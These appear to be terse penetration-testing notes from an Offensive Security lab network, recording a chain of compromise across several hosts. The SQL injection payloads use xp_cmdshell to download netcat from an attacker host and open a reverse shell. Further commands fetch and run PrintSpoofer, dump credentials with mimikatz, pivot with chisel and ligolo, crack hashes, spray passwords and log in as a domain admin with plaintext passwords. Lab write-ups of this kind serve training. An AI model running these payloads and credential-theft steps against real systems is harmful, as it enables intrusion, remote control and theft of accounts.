### 192.168.188.121

#### SQL Injection:
http://192.168.188.121/login.aspx

o' ; exec xp_cmdshell "powershell.exe wget http://192.168.45.156:8000/nc64.exe -OutFile c:\\Users\Public\\nc.exe" ; --

o' ; exec xp_cmdshell "c:\\Users\Public\\nc.exe -e cmd.exe 192.168.45.212 4445" ; --

#### priv esc

printspoofer

curl http://192.168.45.156:8000/print.exe -o print.exe

print.exe -i -c cmd.exe

executed mimikatz and found password hash of joe

#### pivot to internal network

chisel 1.8 in kali
chisel server --port 9090 --reverse  
curl http://192.168.45.184:8000/chisel1.8.exe -o chisel.exe

chisel.exe client 192.168.45.184:9090 R:socks

sudo ip tuntap add user mrjokar mode tun ligolo  
sudo ip link set ligolo up
  
./proxy -selfcert -laddr 0.0.0.0:9001
./agent -connect 192.168.45.193:9090 -ignore-cert

sudo ip route add 172.16.123.0/23 dev ligolo

### 172.16.243.11

#### Initial Access
loggedin with joe user using evil-winrm
proxychains -q evil-winrm -i 172.16.243.11 -u joe -p 'Flowers1' 

found password hashes in log file

cracked using
hashcat -m 1000 nthashes.txt /usr/share/wordlists/rockyou.txt -r cap3.rule --force


./mim.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"


### 172.16.243.83

#### Initial Access
loggedin with joe user using evil-winrm
proxychains -q evil-winrm -i 172.16.243.83 -u wario -p 'Flowers1' 

#### priv esc

changed exe in c:\developmentexecutables

sprayed password using spraypassword.ps1 and found yoshi as admin on 82

### 172.16.243.82

started rdp connection to 82 as yoshi user and found the flags

### 172.16.243.12

started rdp connection as yoshi user

escalated privilige by changing c:\TEMP\backup.exe

found password of leon using mimikatz

### 172.16.243.13

loggdin using winrm with leon (domain admin)

### 172.16.243.10

loggedin using evilwinrm with leon
found credentials.txt with password of web01


### 192.168.231.120

logged in with offsec password and credentials

switched to root with su root and offsec's pasword





